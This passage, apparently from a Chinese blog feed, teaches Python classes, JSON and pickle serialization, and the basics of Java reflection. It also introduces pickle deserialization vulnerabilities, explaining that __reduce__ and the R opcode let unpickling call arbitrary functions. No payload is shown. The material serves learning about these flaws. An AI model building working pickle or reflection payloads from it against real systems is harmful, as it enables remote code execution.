0x10d066878&gt;<br>__main__.Test<br></code></pre></td></tr></table></figure><p>从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 <strong>self.<strong>class</strong></strong> 则指向类。</p><p>注意：self并不是python关键字，将其换成其他字符串如piiick也可以正常执行。</p><h4 id="创建实例对象"><a href="#创建实例对象" class="headerlink" title="创建实例对象"></a>创建实例对象</h4><p>实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。</p><p>以下使用类的名称 Employee 来实例化，并通过 <strong>init</strong> 方法接收参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;创建 Employee 类的第一个对象&quot;</span><br>emp1 = Employee(<span class="hljs-string">&quot;Zara&quot;</span>, <span class="hljs-number">2000</span>)<br><span class="hljs-string">&quot;创建 Employee 类的第二个对象&quot;</span><br>emp2 = Employee(<span class="hljs-string">&quot;Manni&quot;</span>, <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><h4 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h4><p>可以使用点号 <strong>.</strong> 来访问对象的属性。使用如下类的名称访问类变量:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">emp1.displayEmployee()<br>emp2.displayEmployee()<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Total Employee %d&quot;</span> % Employee.empCount<br></code></pre></td></tr></table></figure><p><strong>完整实例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>:<br>    <span class="hljs-string">&#x27;所有员工的基类&#x27;</span><br>    empCount = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, salary</span>):<br>        self.name = name<br>        self.salary = salary<br>        Employee.empCount += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayCount</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total Employee %d&quot;</span> % Employee.empCount)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayEmployee</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Name : &quot;</span>, self.name, <span class="hljs-string">&quot;, Salary: &quot;</span>, self.salary)<br><br><br><span class="hljs-string">&quot;创建 Employee 类的第一个对象&quot;</span><br>emp1 = Employee(<span class="hljs-string">&quot;Zara&quot;</span>, <span class="hljs-number">2000</span>)<br><span class="hljs-string">&quot;创建 Employee 类的第二个对象&quot;</span><br>emp2 = Employee(<span class="hljs-string">&quot;Manni&quot;</span>, <span class="hljs-number">5000</span>)<br>emp1.displayEmployee()<br>emp2.displayEmployee()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total Employee %d&quot;</span> % Employee.empCount)<br></code></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Name :  Zara , Salary:  2000<br>Name :  Manni , Salary:  5000<br>Total Employee 2<br></code></pre></td></tr></table></figure><p>还可以添加，删除，修改类的属性，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">emp1.age = <span class="hljs-number">7</span>  <span class="hljs-comment"># 添加一个 &#x27;age&#x27; 属性</span><br>emp1.age = <span class="hljs-number">8</span>  <span class="hljs-comment"># 修改 &#x27;age&#x27; 属性</span><br><span class="hljs-keyword">del</span> emp1.age  <span class="hljs-comment"># 删除 &#x27;age&#x27; 属性</span><br></code></pre></td></tr></table></figure><p>也可以使用以下函数的方式来访问属性：</p><ul><li>getattr(obj, name[, default]) : 访问对象的属性。</li><li>hasattr(obj,name) : 检查是否存在一个属性。</li><li>setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。</li><li>delattr(obj, name) : 删除属性。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">hasattr</span>(emp1, <span class="hljs-string">&#x27;age&#x27;</span>)    <span class="hljs-comment"># 如果存在 &#x27;age&#x27; 属性返回 True。</span><br><span class="hljs-built_in">getattr</span>(emp1, <span class="hljs-string">&#x27;age&#x27;</span>)    <span class="hljs-comment"># 返回 &#x27;age&#x27; 属性的值</span><br><span class="hljs-built_in">setattr</span>(emp1, <span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-number">8</span>) <span class="hljs-comment"># 添加属性 &#x27;age&#x27; 值为 8</span><br><span class="hljs-built_in">delattr</span>(emp1, <span class="hljs-string">&#x27;age&#x27;</span>)    <span class="hljs-comment"># 删除属性 &#x27;age&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Python内置类属性"><a href="#Python内置类属性" class="headerlink" title="Python内置类属性"></a>Python内置类属性</h4><ul><li><strong>dict</strong> : 类的属性（包含一个字典，由类的数据属性组成）</li><li><strong>doc</strong> :类的文档字符串</li><li><strong>name</strong>: 类名</li><li><strong>module</strong>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）</li><li><strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）</li></ul><p><strong>实例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>:<br>    <span class="hljs-string">&#x27;所有员工的基类&#x27;</span><br>    empCount = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, salary</span>):<br>        self.name = name<br>        self.salary = salary<br>        Employee.empCount += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayCount</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total Employee %d&quot;</span> % Employee.empCount)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">displayEmployee</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Name : &quot;</span>, self.name, <span class="hljs-string">&quot;, Salary: &quot;</span>, self.salary)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Employee.__doc__:&quot;</span>, Employee.__doc__)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Employee.__name__:&quot;</span>, Employee.__name__)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Employee.__module__:&quot;</span>, Employee.__module__)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Employee.__bases__:&quot;</span>, Employee.__bases__)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Employee.__dict__:&quot;</span>, Employee.__dict__)<br></code></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Employee.__doc__: 所有员工的基类<br>Employee.__name__: Employee<br>Employee.__module__: __main__<br>Employee.__bases__: (&lt;class &#x27;object&#x27;&gt;,)<br>Employee.__dict__: &#123;&#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: &#x27;所有员工的基类&#x27;, &#x27;empCount&#x27;: 0, &#x27;__init__&#x27;: &lt;function Employee.__init__ at 0x000002A3CB538AE0&gt;, &#x27;displayCount&#x27;: &lt;function Employee.displayCount at 0x000002A3CB539760&gt;, &#x27;displayEmployee&#x27;: &lt;function Employee.displayEmployee at 0x000002A3CB539800&gt;, &#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;Employee&#x27; objects&gt;, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;Employee&#x27; objects&gt;&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="Python中的序列化与反序列化"><a href="#Python中的序列化与反序列化" class="headerlink" title="Python中的序列化与反序列化"></a>Python中的序列化与反序列化</h3><h4 id="JSON序列化与反序列化"><a href="#JSON序列化与反序列化" class="headerlink" title="JSON序列化与反序列化"></a>JSON序列化与反序列化</h4><p>JSON 是一个文件格式，也是一个标准化的数据传输方案，通常网站的后端和前端的交流，移动 APP 和云服务器的交流方式都是通过 JSON。</p><p>Python的JSON模块 序列化与反序列化的过程分别叫做：<strong>encoding</strong> 和 <strong>decoding</strong>。</p><ul><li>*<strong>encoding：*</strong> 把Python对象转换成JSON字符串</li><li>*<strong>decoding：*</strong> 把JSON字符串转换成python对象</li></ul><p>json模块提供了以下两个方法来进行序列化和反序列化操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 序列化：将Python对象转换成json字符串</span><br>dumps(obj, skipkeys=<span class="hljs-literal">False</span>, ensure_ascii=<span class="hljs-literal">True</span>, check_circular=<span class="hljs-literal">True</span>, allow_nan=<span class="hljs-literal">True</span>, cls=<span class="hljs-literal">None</span>, indent=<span class="hljs-literal">None</span>, separators=<span class="hljs-literal">None</span>, default=<span class="hljs-literal">None</span>, sort_keys=<span class="hljs-literal">False</span>, **kw)<br> <br><span class="hljs-comment"># 反序列化：将json字符串转换成Python对象</span><br>loads(s, encoding=<span class="hljs-literal">None</span>, cls=<span class="hljs-literal">None</span>, object_hook=<span class="hljs-literal">None</span>, parse_float=<span class="hljs-literal">None</span>, parse_int=<span class="hljs-literal">None</span>, parse_constant=<span class="hljs-literal">None</span>, object_pairs_hook=<span class="hljs-literal">None</span>, **kw)<br></code></pre></td></tr></table></figure><p>此外还有额外两个方法允许我们直接将序列化后得到的json数据保存到文件中，以及直接读取文件中的json数据进行反序列化操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 序列化：将Python对象转换成json字符串并存储到文件中</span><br>dump(obj, fp, skipkeys=<span class="hljs-literal">False</span>, ensure_ascii=<span class="hljs-literal">True</span>, check_circular=<span class="hljs-literal">True</span>, allow_nan=<span class="hljs-literal">True</span>, cls=<span class="hljs-literal">None</span>, indent=<span class="hljs-literal">None</span>, separators=<span class="hljs-literal">None</span>, default=<span class="hljs-literal">None</span>, sort_keys=<span class="hljs-literal">False</span>, **kw)<br> <br><span class="hljs-comment"># 反序列化：读取指定文件中的json字符串并转换成Python对象</span><br>load(fp, cls=<span class="hljs-literal">None</span>, object_hook=<span class="hljs-literal">None</span>, parse_float=<span class="hljs-literal">None</span>, parse_int=<span class="hljs-literal">None</span>, parse_constant=<span class="hljs-literal">None</span>, object_pairs_hook=<span class="hljs-literal">None</span>, **kw)<br></code></pre></td></tr></table></figure><h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a><strong>实例</strong></h5><p><strong>序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入json模块</span><br><span class="hljs-keyword">import</span> json<br><br>simple_dict = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;str中国&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>:(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)&#125;<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;simple_dict.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file_to_write:<br>    <span class="hljs-comment"># 进行json序列化,然后写入simple_dict.txt文件中</span><br>    json.dump(simple_dict, file_to_write)<br></code></pre></td></tr></table></figure><p><strong>序列化后字符为</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&quot;a&quot;: &quot;str\u4e2d\u56fd&quot;, &quot;c&quot;: true, &quot;e&quot;: 10, &quot;b&quot;: 11.1, &quot;d&quot;: null, &quot;f&quot;: [1, 2, 3], &quot;g&quot;: [4, 5, 6]&#125;<br></code></pre></td></tr></table></figure><p><strong>反序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入json模块</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;simple_dict.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file_to_read:<br>    loaded_simple_dict = json.load(file_to_read)<br>    <span class="hljs-built_in">print</span>(loaded_simple_dict)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(loaded_simple_dict))<br></code></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#x27;a&#x27;: &#x27;str中国&#x27;, &#x27;c&#x27;: True, &#x27;e&#x27;: 10, &#x27;b&#x27;: 11.1, &#x27;d&#x27;: None, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;: [4, 5, 6]&#125;<br>&lt;class &#x27;dict&#x27;&gt;<br></code></pre></td></tr></table></figure><h4 id="PICKLE序列化与反序列化"><a href="#PICKLE序列化与反序列化" class="headerlink" title="PICKLE序列化与反序列化"></a>PICKLE序列化与反序列化</h4><p>pickle模块实现了用于对Python对象结构进行 序列化 和 反序列化 的二进制协议，与json模块不同的是pickle模块序列化和反序列化的过程分别叫做 pickling 和 unpickling：</p><ul><li>*<strong>pickling：*</strong> 是将Python对象转换为字节流的过程；</li><li>*<strong>unpickling：*</strong> 是将字节流二进制文件或字节对象转换回Python对象的过程；</li></ul><h5 id="pickle模块与json模块对比"><a href="#pickle模块与json模块对比" class="headerlink" title="pickle模块与json模块对比"></a>pickle模块与json模块对比</h5><ul><li>JSON是一种文本序列化格式（它输出的是unicode文件，大多数时候会被编码为utf-8），而pickle是一个二进制序列化格式;</li><li>JOSN是我们可以读懂的数据格式，而pickle是二进制格式，我们无法读懂；</li><li>JSON是与特定的编程语言或系统无关的，且它在Python生态系统之外被广泛使用，而pickle使用的数据格式是特定于Python的；</li><li>默认情况下，JSON只能表示Python内建数据类型，对于自定义数据类型需要一些额外的工作来完成；pickle可以直接表示大量的Python数据类型，包括自定数据类型</li><li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li></ul><h5 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a><strong>实例</strong></h5><p><strong>序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>abc_dict = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;str中国&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>: [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;abc.pk&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file_to_write:  <br>    <span class="hljs-comment">#wb为二进制写入模式</span><br>    pickle.dump(abc_dict, file_to_write)<br></code></pre></td></tr></table></figure><p><strong>反序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;abc.pk&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file_to_read:<br>    <span class="hljs-comment"># 以二进制的形式进行读取文件</span><br>    abc_dict_pk = pickle.load(file_to_read)<br>    <span class="hljs-built_in">print</span>(abc_dict_pk)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(abc_dict_pk))<br></code></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#x27;a&#x27;: &#x27;str中国&#x27;, &#x27;c&#x27;: True, &#x27;e&#x27;: 10, &#x27;b&#x27;: 11.1, &#x27;d&#x27;: None, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;: [4, 5, 6]&#125;<br>&lt;class &#x27;dict&#x27;&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h3><p>参考<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjeaLxIxAK4eqiYq=x#toc-13">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><h4 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h4><p><strong>pickle可序列化的对象：</strong></p><ul><li><p>None、True 和 False</p></li><li><p>整数、浮点数、复数</p></li><li><p>str、byte、bytearray</p></li><li><p>只包含可封存对象的集合，包括 tuple、list、set 和 dict</p></li><li><p>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</p></li><li><p>定义在模块最外层的内置函数</p></li><li><p>定义在模块最外层的类</p></li><li><p><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类</p></li></ul><p>（详见官方文档<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst">pickle —— Python 对象序列化 — Python 3.7.13 文档</a>）</p><p><strong><code>object.__reduce__()</code> 函数</strong></p><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java反射</title>
    <link href="/2024/08/01/%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/08/01/%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是java反射"><a href="#什么是java反射" class="headerlink" title="什么是java反射"></a>什么是java反射</h3><p>Java反射是Java的一种特性，它可以让程序在运行时获取自身的信息，并且动态地操作类或对象的属性、方法和构造器等。Java反射指的是在Java程序运行状态中，对于任何一个类，都可以获得这个类的所有属性和方法；对于给定的一个对象，都能够调用它的任意一个属性和方法。这种动态获取类的内容以及动态调用对象的方法称为反射机制。</p><p><strong>反射在反序列化漏洞中的应用：</strong></p><p>定制需要的对象</p><p>通过invoke调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><h3 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h3><h4 id="获取Class对象的四种方式"><a href="#获取Class对象的四种方式" class="headerlink" title="获取Class对象的四种方式"></a>获取Class对象的四种方式</h4><p><code>java.lang.Class</code>类是反射的基础，存放对应对象的运行时的信息。在Java程序运行时，JVM为所有类型维护一个<code>java.lang.Class</code>对象，即每种类型的Class对象只有一个。Class对象是我们进行反射操作的入口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//方式一：通过该实例变量提供的getClass()方法获取</span><br><span class="hljs-comment">//Object.getClass()</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">studentClass</span> <span class="hljs-operator">=</span> student.getClass();<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//方式二：直接通过一个class的静态变量class获取：</span><br><span class="hljs-comment">//T.class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">studentClass</span> <span class="hljs-operator">=</span> Student.class;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//方式三：知道一个class的完整类名，可以通过静态方法Class.forName()获取</span><br><span class="hljs-comment">//static Class&lt;?&gt; Class.forName</span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">studentClass_3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;lic.reflect.Student&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;Class.forName = &quot;</span> + studentClass);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException exception) &#123;                <span class="hljs-comment">//此方式会抛出 ClassNotFoundException 异常</span><br>    exception.printStackTrace(System.err);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//方式四：通过 ClassLoader</span><br><span class="hljs-keyword">try</span> &#123;    <br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();    <br>    Class&lt;?&gt; c = classLoader.loadClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>在Class对象中一般有三类信息：构造方法Constructor、成员方法Method、成员变量Field。</p><h4 id="获取构造方法Constructor"><a href="#获取构造方法Constructor" class="headerlink" title="获取构造方法Constructor"></a>获取构造方法Constructor</h4><p><strong>Class类中用于获取构造方法：</strong></p><p><code>Constructor&lt;?&gt;[] getConstructors()</code> 返回所有公共构造方法对象的数组(只能获取public的构造方法)</p><p><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code> 返回所有构造方法对象的数组(所有构造方法，包含private)</p><p><code>Constructor&lt;T&gt; getConsturctor(Class&lt;?&gt;... parameterTypes)</code> 返回单个指定的公共构造方法</p><p><code>Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code> 返回单个指定的构造方法</p><p><strong>带<code>declared</code>的方法和不带<code>declared</code>的方法的区别：</strong></p><ul><li><p>不带 <code>Declared</code>的方法支持取出包括继承、公有（Public） 但不包括有（Private）的构造函数</p></li><li><p>带 <code>Declared</code>的方法是支持取出包括公共（Public）、保护（Protected）、默认（包）访问和私有（Private）的构造方法，但不包括继承的构造函数</p><ul><li><strong><code>T newInstance(Object... initargs)</code></strong> 根据指定的构造方法创建对象</li><li><strong><code>setAccessible(boolean flag)</code></strong> 设置是否取消访问检查，设置为 true 表示取消访问检查，可以提高反射效率</li></ul></li></ul><h4 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h4><p><strong>Class类中用于获取成员变量的方法：</strong></p><p><code>Field[] getFields()</code> 返回此类和父类中所有<code>public</code>的成员变量<br><code>Field[] getDeclaredFields()</code> 返回此类中所有的成员变量，不包括父类<br><code>FIeld getField(String name)</code> 从此类和父类中查找对应的<code>public</code>成员变量并返回<br><code>Field getDeclaredField(String name)</code> 在此类中查找指定的成员变量并返回</p><p><strong>Field 类中用于设置和获取成员变量的方法：</strong></p><p><code>void set(Object obj, Object value)</code> 设置 obj 对象中的此成员变量设置为 <code>value</code><br><code>Object get(Object obj)</code> 获取 <code>obj</code> 对象中的此成员变量<br><code>String getName()</code> 获取此成员变量的名称<br><code>Class&lt;?&gt; getType()</code> 获取此成员变量的类型<br><code>int getModifiers()</code> 获取此成员变量的修饰符（即 <code>private volatile</code>之类的），通过 <code>Modifier</code> 类方便查询</p><h4 id="获取成员方法Method："><a href="#获取成员方法Method：" class="headerlink" title="获取成员方法Method："></a>获取成员方法Method：</h4><p><strong>Class 类中用于获取成员变量的方法：</strong></p><p><code>Method[] getMethdos()</code> 返回所有 <code>public</code> 成员方法的对象，包括继承的<br><code>Method[] getDeclaredMethods()</code> 返回此类中所有成员方法对象的数组<br><code>Method getMethod(String name, Class&lt;?&gt;... parameterTypes)</code> 查找此类及父类中指定的 <code>public</code> 成员方法<br><code>Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code> 查找并返回单个成员方法<br><strong>Method 类中的常用方法：</strong></p><p><code>Object invoke(Object obj, Object... args)</code> 调用 <code>obj</code> 对象上的这个方法<br><code>Class getReturnType()</code> 返回这个方法的返回值类型<br><code>Type getGenericReturnType()</code> 返回这个方法的泛型返回值类型<br><code>Class[] getParameterTypes()</code> 返回这个方法的参数类型<br><code>Type[] getGenericParameterTypes()</code> 返回这个方法的参数的泛型信息<br><code>Annotation[] 